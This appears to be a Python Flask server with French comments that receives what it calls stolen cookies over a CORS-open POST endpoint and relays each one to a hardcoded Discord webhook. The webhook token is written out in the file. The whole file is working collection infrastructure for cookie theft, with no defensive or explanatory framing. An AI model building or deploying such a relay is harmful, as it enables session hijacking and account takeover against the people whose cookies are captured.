from flask import Flask, request
from flask_cors import CORS
import requests
import os
import traceback

app = Flask(__name__)
CORS(app)

# Remplace ce webhook par le tien :
WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"

@app.route("/", methods=["POST"])
def recevoir_cookie():
    try:
        data = request.get_json()
        print("🔍 Données reçues:", data)

        if not data or 'content' not in data:
            print("❌ Requête mal formée : 'content' manquant")
            return "Bad request", 400

        cookie_content = data['content']
        print("🍪 Cookie reçu :", cookie_content)

        discord_data = {"content": cookie_content}
        response = requests.post(WEBHOOK_URL, json=discord_data)

        print("Webhook Discord status:", response.status_code, response.text)

        if response.status_code in [200, 204]:
            print("✅ Cookie envoyé au webhook Discord")
            return "Cookie reçu et envoyé", 200
        else:
            print("⚠️ Erreur envoi webhook Discord")
            return f"Erreur webhook Discord ({response.status_code})", 500

    except Exception as e:
        print("🔥 Exception capturée :")
        traceback.print_exc()
        return "Erreur interne", 500

@app.route("/", methods=["GET"])
def accueil():
    return "✅ Serveur backend en ligne", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)